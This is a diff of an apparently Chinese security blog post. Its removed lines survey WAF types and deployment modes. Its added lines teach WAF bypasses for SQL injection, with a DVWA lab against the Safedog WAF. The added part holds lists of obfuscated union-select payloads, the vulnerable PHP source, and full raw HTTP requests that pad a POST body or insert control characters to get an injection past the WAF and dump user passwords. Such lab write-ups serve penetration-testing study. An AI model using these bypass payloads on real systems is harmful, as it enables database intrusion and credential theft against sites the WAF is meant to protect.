-<li>安装简单、使用方便、成本低：采用纯软件的方式实现</li>
+<li><p>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</p>
+</li>
+<li><p>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</p>
+</li>
+<li><p>大括号{}：union select {``1},{x 2}</p>
+</li>
+<li><p>可利用数学运算以及数据类型：</p>
+<blockquote>
+<p>union select usename,2.0from admin<br>union select username,8e0from admin<br>union select username,\Nfrom admin</p>
+</blockquote>
+</li>
 </ul>
-<p><strong>缺点</strong>：</p>
+</li>
+<li><p>位置⑤</p>
 <ul>
-<li>安全性和可靠性低：软件WAF必须安装Web应用服务器上，所以，除了性能受到限制，还可能存在兼容性、安全性不足及升级成本较高等问题。</li>
+<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
+<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
+<li>反引号`：union select 1,table_name,3  from`information_schema`.`tables`limit 0,1%23</li>
+<li>内联注释：union select 1,table_name,3  from /*!50001information_schema.tables*/ limit 0,1%23</li>
+<li>大括号{}：union select 1,table_name,3  from{x information_schema.tables}limit 0,1%23</li>
+<li>小括号()：union select 1,table_name,3  from(information_schema.tables)limit 0,1%23</li>
 </ul>
-<p><strong>主流产品</strong>：网站安全狗、云锁、D盾、宝塔面板、ModSecurity、Naxsi、360网站卫士、360webscan</p>
-<h3 id="硬件WAF"><a href="#硬件WAF" class="headerlink" title="硬件WAF"></a>硬件WAF</h3><p><strong>优点</strong>：</p>
+</li>
+</ul>
+<h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
+<p>数据库：MySQL 5.5</p>
+<p>Web脚本：PHP 5.4.19</p>
+<p>WAF：网站安全狗（Apache版）v4.0.2313</p>
+<p><img src="https://i.loli.net/2021/10/14/O1zMRZh2BSXbfr8.png" alt="image-20211014211210255"></p>
+<p>让我们查看一下DVWA-LOW级别SQL注入的源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里是采用$_REQUEST的方式进行表单数据的传递。这就说明既可以使用GET方式传参，也可以使用POST方式进行传参。</p>
+<h3 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h3><h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>资源限制：WAF长度资源限制</strong></p>
+<p>假如HTTP请求POST BODY太大，检测所有内容，WAF集群消耗太多的CPU、内存资源。因此许多WAF只检测前面的2M或4M的内容。对于攻击者而言，只需要在POST BODY前面添加许多无用的数据，把攻击的payload放在最后即可绕过WAF检测。</p>
+<p><strong>绕过技巧</strong>：</p>
 <ul>
-<li>可承受较高的吞吐量。</li>
-<li>性能好、功能全、支持多种部署方式</li>
-<li>即插即用：由于硬件防部署简易，硬件WAF只需串联到网络中，进行简单的配置后即可实现Web安全防护。</li>
-<li>防护范围大：由于硬件防火墙直接串联到了交换机，所以在同一个交换机下的所有服务器，都处于防火墙的防护范围之类。</li>
+<li>GET型请求转POST型</li>
+<li>Content-Length头长度大于8200</li>
+<li>正常参数在脏数据后面，否则无效</li>
 </ul>
-<p><strong>缺点</strong>：</p>
+<p><strong>数据包构造</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8200</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span class="line">a=/*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCCCCCCCDDDDDBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCSSSSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB&amp;id=1&#x27; union select null,concat_ws(char(32,58,32),user,password) from users%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/15/TGSn9jEO6YJwzKL.png" alt="image-20211015235313081"></p>
+<h3 id="函数分隔符绕过"><a href="#函数分隔符绕过" class="headerlink" title="函数分隔符绕过"></a>函数分隔符绕过</h3><h4 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：函数与括号之间插入分隔符可以正常执行</strong></p>
+<p>对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，“concat(”或者”concat\s*(”，就没有考虑到一些特殊字符。相应的绕过方法，在特殊位置引入特殊的分隔符，逐个测试。这些特殊分隔符发现也是通过Fuzz出来的。</p>
+<p><strong>绕过技巧</strong>：</p>
 <ul>
-<li>价格昂贵，动辄几十万。</li>
-<li>存在一定误杀：由于硬件WAF是通过攻击规则库对异常流量进行识别，所以在业务系统复杂的情况下，可能存在一定误杀导致正常功能被防火墙拦截导致影响正常业务。</li>
-<li>存在一定绕过机率：硬件防火墙对HTTP协议进行自行解析，可能存在与Web服务器对HTTP请求的理解不一致从而导致被绕过。</li>
+<li>函数与括号之间可以插入空白符或多行注释达到绕过</li>
+<li>GET型请求转POST型</li>
 </ul>
-<p><strong>主流厂商</strong>：启明星辰、安恒、绿盟、天融信、飞塔</p>
-<h3 id="自定义WAF"><a href="#自定义WAF" class="headerlink" title="自定义WAF"></a>自定义WAF</h3><p>我们在平时的渗透测试中，更多情况下会遇到的是网站开发人员自己写的防护规则。网站开发人员为了网站的安全，会在可能遭受攻击的地方增加一些安全防护代码，比如过滤敏感字符，对潜在的威胁的字符进行编码、转义等。</p>
-<h2 id="WAF的部署模式"><a href="#WAF的部署模式" class="headerlink" title="WAF的部署模式"></a>WAF的部署模式</h2><h3 id="基于DNS解析的云WAF"><a href="#基于DNS解析的云WAF" class="headerlink" title="基于DNS解析的云WAF"></a>基于DNS解析的云WAF</h3><p>修改DNS，让域名解析到反向代理服务器。所有流量经过反向代理进行检测，检测无问题之后再转发给后端的Web服务器。</p>
-<p><img src="https://i.loli.net/2021/10/13/BO6zTMUWfyswQXY.png" alt="image-20211013200415493"></p>
-<h3 id="串联模式"><a href="#串联模式" class="headerlink" title="串联模式"></a>串联模式</h3><p>硬件防护设备串在网络链路中，所有的流量经过核心交换机引流到防护设备中，在防护设备中对请求进行检测，合法的请求会把流量发送给Web服务器。当发现攻击行为时，会阻断该请求，后端Web服务器无感知到任何请求。</p>
-<h4 id="反向代理模式"><a href="#反向代理模式" class="headerlink" title="反向代理模式"></a>反向代理模式</h4><p>WAF作为反向代理服务器向后端服务器转发收到的HTTP请求，在转发的同时会对经过的HTTP请求做攻击检测。</p>
-<p>但该模式会改变现有网络结构，用户真实IP会以HTTP Header传递给后端web服务器，需要提前配置好域名与目的服务器的转发规则，在站点和后端Web服务器较多的情况下，转发规则等配置较复杂。</p>
-<p><img src="https://i.loli.net/2021/10/13/aDk4bswpCzfmvYH.png" alt="image-20211013204206923"></p>
-<h4 id="透明代理模式"><a href="#透明代理模式" class="headerlink" title="透明代理模式"></a>透明代理模式</h4><p>WAF将客户端与web服务器之间TCP连接监控下来。在用户无感知的情况下代理了WEB客户端和服务器之间的会话，并基于桥模式进行转发。从WEB客户端的角度看，WEB客户端仍然是直接访问服务器。</p>
-<p>从WAF工作转发原理看和透明网桥转发一样，因而称之为透明代理模式。该方式的特点是：对网络的改动最小，可以实现零配置部署。</p>
-<p><img src="https://i.loli.net/2021/10/13/WE5du69PhSpbcOV.png" alt="image-20211013204502126"></p>
-<h3 id="旁路模式"><a href="#旁路模式" class="headerlink" title="旁路模式"></a>旁路模式</h3><p>利用交换机的端口镜像功能，将业务流量转发一份给WAF，WAF只对业务流量进行监控和报警，不进行拦截阻断。对于WAF而言，流量只进不出。</p>
-<p>该模式的特点是：在WAF出故障的情况下，不影响业务连续性。但是需要联动其他设备(如出口防火墙)来下发阻断策略。</p>
-<p><img src="https://i.loli.net/2021/10/13/jUYgnTHedQFhISW.png" alt="image-20211013204644602"></p>
-<h3 id="软件嵌入中间件-检测引擎模式"><a href="#软件嵌入中间件-检测引擎模式" class="headerlink" title="软件嵌入中间件 + 检测引擎模式"></a>软件嵌入中间件 + 检测引擎模式</h3><p>​    </p>
-<p><img src="https://i.loli.net/2021/10/13/GZwQ5FTdUfJ1a8S.png" alt="image-20211013204950399"></p>
-<h2 id="WAF绕过的实现"><a href="#WAF绕过的实现" class="headerlink" title="WAF绕过的实现"></a>WAF绕过的实现</h2><h3 id="WAF为什么会被绕过？"><a href="#WAF为什么会被绕过？" class="headerlink" title="WAF为什么会被绕过？"></a>WAF为什么会被绕过？</h3><ul>
-<li>鱼（安全）与 熊掌（业务性能）不可兼得</li>
-<li>WAF为了考虑通用性的问题，无法100%覆盖某些语言、中间件、数据库的特性；</li>
-<li>硬件WAF自身往往存在漏洞</li>
+<p><strong>数据包构造</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 83</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws(char%0a%0d(32,58,32),user,password) from users #</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/16/lhWsHSvDfrwjN2Q.png" alt="image-20211016103625239"></p>
